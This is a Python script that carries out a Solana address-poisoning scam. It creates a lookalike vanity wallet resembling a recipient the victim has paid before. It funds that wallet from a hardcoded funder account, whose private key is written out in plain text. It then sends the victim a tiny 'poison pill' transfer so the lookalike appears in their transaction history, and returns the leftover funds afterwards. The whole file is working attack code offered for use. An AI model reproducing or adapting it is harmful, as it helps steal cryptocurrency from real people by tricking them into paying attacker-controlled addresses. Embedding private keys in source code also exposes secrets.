import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "vanitygenerator")))
from soltransfer.sol_xfr import send_sol
import time
from vanitygenerator.generatekeys import generate_similar_address
import base58
import json
import logging


funderpubkey = "2bAFrDAgqP5TVfeuZ82JxJTimk9mmaa2ZBwmaMZ5Px2Z"
funderprivkey = "5PpMF7zLtUpcMaWh6AEkWpMyP185X3ixLQFtPdGJj68k3jiHJFkVUCc1BkJtGHhFQnYiQPkcEW3ZS75Y4mArBenZ"
rpc_url = "http://new-york.rpc.pinnaclenode.com"
initial_fund = 0.001000000
poison_pill = 0.00001
min_gas = 0.000005000
cu_prc   = 0
cu_lmt   = 250000

def safe_send_sol(*args, **kwargs):
    max_retries = 3
    delay = 2
    for attempt in range(1, max_retries + 1):
        try:
            return send_sol(*args, **kwargs)
        except Exception as e:
            logging.error(f"Attempt {attempt}: Error sending SOL: {e}")
            if attempt < max_retries:
                time.sleep(delay)
                delay *= 2
            else:
                logging.error(f"All {max_retries} attempts failed for send_sol with args: {args}, kwargs: {kwargs}")
                return None

def poison(detectedsender, detectedreceiver):
    similar_address = generate_similar_address(detectedreceiver)
    print(f"Generated address: {similar_address} to poison {detectedreceiver} who received funds from {detectedsender}")
    with open("generated_wallets.jsonl", "a") as f:
        json.dump(similar_address, f)
        f.write("\n")
    #send sol from our funder to the similar address
    safe_send_sol(funderpubkey, funderprivkey, similar_address["public_key"], initial_fund, cu_prc, cu_lmt, rpc_url, 'Y')
    time.sleep(10)
    print(f"funded {similar_address['public_key']}")
    #send sol from the similar address to the detected sender
    safe_send_sol(similar_address["public_key"], base58.b58encode(bytes(similar_address["private_key_array"])).decode(), detectedsender, poison_pill, cu_prc, cu_lmt, rpc_url, 'Y')
    time.sleep(10)
    print(f"Poisoned {detectedsender} with {similar_address['public_key']}")
    #return the rent amount back to the funder
    safe_send_sol(similar_address["public_key"], base58.b58encode(bytes(similar_address["private_key_array"])).decode(), funderpubkey,  initial_fund-poison_pill-min_gas*2, cu_prc, cu_lmt, rpc_url, 'Y')
    time.sleep(10)
    print(f"Returned rent to {funderpubkey}")

if __name__ == "__main__":
    poison("v35gGprpLs4jz1MtNynvhZWpQBg3uohed3HZgCBfGw7", "v35gGprpLs4jz1MtNynvhZWpQBg3uohed3HZgCBfGw7")



